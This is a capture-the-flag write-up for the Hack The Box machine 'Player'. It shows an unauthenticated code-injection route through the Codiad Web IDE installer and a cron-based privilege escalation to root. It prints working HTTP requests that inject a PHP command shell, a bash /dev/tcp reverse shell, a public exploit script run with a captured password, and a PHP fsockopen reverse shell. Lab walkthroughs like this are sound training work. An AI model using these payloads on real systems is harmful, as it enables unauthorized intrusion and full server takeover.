# Alternative way to exploit Player

## Exploiting Codiad on HTTP (dev.player.htb)

Instead of exploiting the **OpenSSH 7.2 vulnerability** and getting the credentials of _peter_ to get into _dev.player.htb_, there is a way to get a shell directly as _www-data_.

In the HTML source of _dev.player.htb_ is the JavaScript file _/components/user/init.js_ that reveals that the page is built with the framework [Codiad Web IDE](https://github.com/Codiad/Codiad) which is not maintained anymore.

This can be exploited as explained in this [blog post from Jianshu](https://www.jianshu.com/p/b09d20af2374).

POST request to _components/install/process.php_ to create the directory _data_ and _workspace_ on _chat.player.htb_:
```
POST /components/install/process.php HTTP/1.1
Host: dev.player.htb
(...)

path=RandomString1&username=testuser&password=pass123&project_name=/var/www/chat/data
```
```
POST /components/install/process.php HTTP/1.1
Host: dev.player.htb
(...)

path=RandomString1&username=testuser&password=pass123&project_name=/var/www/chat/workspace
```

It responds with the HTTP code _403 Forbidden_ which proofs that it worked.

POST request to exploit **Codiad**:
```
POST /components/install/process.php HTTP/1.1
(...)
path=%2fvar%2fwww%2fchat&username=testuser&password=pass123&password_confirm=pass123&project_name=RandomProjectName1&project_path=%2fvar%2fwww%2fchat&timezone=America%2fNew_York")%3bsystem($_REQUEST['cmd'])%3b//
```

Browsing to _chat.player.htb/config.php_ and executing commands:
```
http://chat.player.htb/config.php?cmd=whoami
```

It shows the output of `whoami` which is _www-data_ and proofs command execution.
Getting a reverse shell:
```
GET /config.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.21/9001 0>&1' HTTP/1.1
Host: chat.player.htb
```

After URL-encoding the request and sending it, the listener on my IP and port 9001 starts a reverse shell session as _www-data_.

### Authenticated RCE on Codiad

There is also a [Python script to exploit Codiad](https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit) with valid credentials.
So this only works after getting the credentials of _peter_:
```
python codiad_rce.py http://dev.player.htb/ peter 'CQXpm\z)G5D#%S$y=' 10.10.14.21 9002 linux
```

After following the instructions and running both `nc` commands, the listener on my IP and port 9003 starts a reverse shell session as _www-data_.

## Privilege Escalation

The file _/var/lib/playbuff/buff.php_ includes a file that is owned by _www-data_:
```
include("/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php");
```

This PHP file runs also every time, when _buff.php_ runs.
As _www-data_ can modify it, we are able to put malicious code in there to get command execution.

Putting the following PHP code into _var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php_:
```
<?php $sock=fsockopen("10.10.14.21",9002);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

After the cronjob for _buff.php_ runs again, the command gets executed and starts a reverse shell session on my IP and port 9002 as root!
